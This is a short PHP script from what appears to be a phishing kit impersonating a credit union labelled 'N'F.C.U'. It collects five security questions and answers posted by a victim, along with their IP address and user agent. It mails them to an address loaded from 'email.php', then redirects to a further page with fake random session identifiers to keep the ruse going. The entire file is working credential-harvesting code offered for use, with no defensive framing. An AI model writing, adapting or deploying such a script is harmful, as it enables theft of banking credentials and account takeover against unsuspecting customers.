<?php
if($_POST["q1"] != "" and $_POST["a1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------N'F.C.U Info-----------------------\n";
$message .= "Question 1            	: ".$_POST['q1']."\n";
$message .= "Answer 1            	: ".$_POST['a1']."\n";
$message .= "Question 2             : ".$_POST['q2']."\n";
$message .= "Answer 2               : ".$_POST['a2']."\n";
$message .= "Question 3             : ".$_POST['q3']."\n";
$message .= "Answer 3            	: ".$_POST['a3']."\n";
$message .= "Question 4             : ".$_POST['q4']."\n";
$message .= "Answer 4            	: ".$_POST['a4']."\n";
$message .= "Question 5             : ".$_POST['q5']."\n";
$message .= "Answer 5            	: ".$_POST['a5']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf6.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>